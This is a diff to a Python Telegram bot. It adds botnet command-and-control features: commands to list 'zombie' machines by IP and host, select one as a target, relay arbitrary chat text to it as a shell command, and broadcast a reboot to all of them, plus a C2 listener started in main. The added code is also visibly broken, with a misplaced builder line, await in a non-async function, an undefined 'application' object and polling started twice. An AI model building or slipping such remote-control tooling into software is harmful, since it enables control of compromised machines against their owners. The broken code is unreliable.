@@ -3491,14 +3491,67 @@ async def list_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = "**Active Zombies:**\n"
     buttons = []
     for sid, info in ACTIVE_BOTS.items():
-        msg += f"ID: `{sid[:20]}...` | IP: {info['ip']} | Host: {info.get('host', 'Unknown')}\n"
-        buttons.append([InlineKeyboardButton(f"Target: {sid[:15]}", callback_data=f"sel_{sid}")
+        ip = info.get("ip", "Unknown")
+        host = info.get("host", "Unknown")
+        
+        display_sid = f"{sid[:20]}..." if len(sid) > 20 else sid
+        
+        msg += (
+            f"ID: `{display_sid}` | "
+            f"IP: `{ip}` | "
+            f"Host: `{host}`\n"
+        )
+        callback_id = sid[:40]
+        
+        buttons.append([
+            InlineKeyboardButton(
+                f"Target: {sid[:15]}",
+                callback_data=f"sel_{callback_id}"
+            )
+        ])
     
     keyboard = InlineKeyboardMarkup(buttons)
-    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=keyboard)
+    
+    if update.effective_message:
+        await update.effective_message.reply_text(
+             msg,
+             parse_mode="Markdown",
+             reply_markup=keyboard
+        )
     
 async def select_target_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query
+    query = update.callback_query
+    await query.answer()
+    session_id = query.data.replace("sel_", "")
+    context.user_data['current_target'] = session_id
+    await query.edit_message_text(f"Target Selected: `{session_id}`. Send command in chat.")
+    
+async def execute_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        return
+        
+    if 'current_target' not in context.user_data:
+        await update.message.reply_text("No target selected. Use /list first.")
+        return
+        
+    session_id = context.user_data['current_target']
+    command = update.message.text
+    
+    # Check if there's a command queue logic needed or direct send
+    success = await C2_SERVER.send_command(session_id, command)
+    
+    if success:
+        await update.message.reply_text(f"Command sent to `{session_id}`: `{command}`\nWaiting for output...".format(session_id=session_id, command=command), parse_mode="Markdown")
+    else:
+        await update.message.reply_text(f"Failed to send command to `{session_id}`. Zombie may be offline.".format(session_id=session_id), parse_mode="Markdown")
+        
+async def reboot_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        return
+    await update.message.reply_text("Broadcasting reboot command to all zombies...")
+    for sid in ACTIVE_BOTS:
+        await C2_SERVER.send_command(sid, "SYSTEM_REBOOT")
+    await update.message.reply_text("Reboot signal sent.")
 
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
@@ -5815,8 +5868,12 @@ def log_tor_status() -> bool:
     )
     return False
 
+C2_SERVER = C2Server()
 
 def main():
+    # Start C2 Server in a separate thread/task
+    asyncio.create_task(C2_SERVER.start_listening())
+    
     if not BOT_TOKEN:
         raise SystemExit("BOT_TOKEN is not set. Please check .env file")
         
@@ -5889,6 +5946,7 @@ def main():
         logger.exception("REFDATA: ซิงก์ตอน startup ผิดพลาด (ใช้ไฟล์ในเครื่องต่อได้)")
     
     app = (
+        Application.builder().token("BOT_TOKEN").build()
         ApplicationBuilder()
         .token(BOT_TOKEN)
         .post_init(post_init)
@@ -5957,6 +6015,9 @@ def main():
     app.add_handler(CommandHandler("pttune", cmd_pttune))
     app.add_handler(CommandHandler("ptcoverage", cmd_ptcoverage))
     app.add_handler(CommandHandler("purple_report", cmd_purple_report))
+    app.add_handler(CommandHandler("starts", start))
+    app.add_handler(CommandHandler("list", list_zombies))
+    app.add_handler(CommandHandler("reboot", reboot_zombies))
     # cmd_bbreport existed but was never registered, so /bbreport was
     # unreachable and bb_report.py was dead code. Registered here with
     # the rest of the reporting commands.
@@ -6003,9 +6064,9 @@ def main():
         handle_imagine_caption,
     ))
     app.add_handler(MessageHandler(
-        (filters.PHOTO | filters.Document.ALL) & filters.CAPTION
+        (filters.PHOTO | filters.TEXT | filters.Document.ALL) & filters.CAPTION
         & ~filters.CaptionRegex(IMAGINE_CAPTION_RE) & ~filters.COMMAND,
-        handle_media_message,
+        handle_media_message, execute_command,
     ))
     # Platform admin commands (/plugins, /workflow, /migration) and any
     # plugin-contributed commands, registered through the same is_admin gate
@@ -6018,6 +6079,19 @@ def main():
             logger.exception("PLATFORM: handler registration failed (core bot unaffected)")
 
     app.add_error_handler(error_handler)
+    
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+    
+    try:
+        await application.updater.start_polling()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        C2_SERVER.stop()
+        await application.stop()
+        await application.shutdown()
 
     logger.info("HANDLERS: OK")
     logger.info("POLLING: STARTED")
